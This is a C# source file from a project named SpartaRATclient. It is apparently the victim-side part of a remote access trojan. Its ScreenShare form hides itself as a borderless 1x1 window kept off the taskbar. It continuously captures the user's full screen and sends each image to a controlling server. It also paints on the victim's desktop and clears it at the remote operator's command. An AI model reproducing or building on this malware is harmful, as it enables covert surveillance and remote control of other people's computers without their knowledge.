using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SpartaRATclient
{
    public partial class ScreenShare : Form
    {
        private Server client;
        [DllImport("User32.dll")]
        public static extern IntPtr GetDC(IntPtr hwnd);
        private Graphics g;
        private SolidBrush b;
        private IntPtr desktopPtr;
        private Color CurrentColor;
        private bool close = false;
        public Bitmap LastScreen;
        public ScreenShare(Server client)
        {
            InitializeComponent();
            this.ForeColor = Color.Black;
            this.Width = 1;
            this.Height = 1;
            this.TopMost = true;
            this.ShowInTaskbar = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.desktopPtr = GetDC(IntPtr.Zero);
            this.g = Graphics.FromHdc(desktopPtr);
            this.b = new SolidBrush(Color.Black);
            this.CurrentColor = Color.Black;

            this.client = client;
            this.client.ScreenStream += StreamMessageEvent;
            this.client.LostConnectionEvent += StreamMessageEvent;
            this.client.PaintStream += Painting;
            this.client.PaintConfigs += ScreenConfigs;
        }
        private void ScreenShare_Load(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(() =>{ StreamEvent(); })).Start();
        }
        private void Painting(byte[] buffer)
        {
            string[] Location = Encoding.ASCII.GetString(buffer).Split('\0');
            Rectangle rect = new Rectangle(int.Parse(Location[0]/*X*/), int.Parse(Location[1/*Y*/]), 10/*WIDTH*/, 10/*HEIGHT*/);
            g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
            g.FillRectangle(b, rect);
        }

        private void ScreenConfigs(byte[] buffer)
        {
            string message = Encoding.ASCII.GetString(buffer);
            if (message == "\0") //clear
            {
                g.Clear(this.CurrentColor);
            }
            if (message == "\0\0") //Change current color
            {
            }
        }

        private void StreamMessageEvent()
        {
            close = true;
            client.PaintStream -= Painting;
            client.PaintConfigs -= ScreenConfigs;
        }

        private void StreamEvent()
        {
            while (!close)
            {
                Bitmap screenCapture = CaptureScreen();
                if (screenCapture != LastScreen)
                {
                    byte[] imageBytes = ConvertBitmapToByteArray(screenCapture);
                    client.Send(imageBytes, 8);
                    LastScreen = screenCapture;
                }
            }
            this.Invoke((MethodInvoker)delegate
            {
                this.Close();
            });
        }

        public Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);

            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                graphics.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;
                graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            }


            return screenshot;
        }

        static byte[] ConvertBitmapToByteArray(Bitmap bitmap)
        {
            using (MemoryStream stream = new MemoryStream())
            {
                bitmap.Save(stream, ImageFormat.Bmp);
                return stream.ToArray();
            }
        }
    }
}
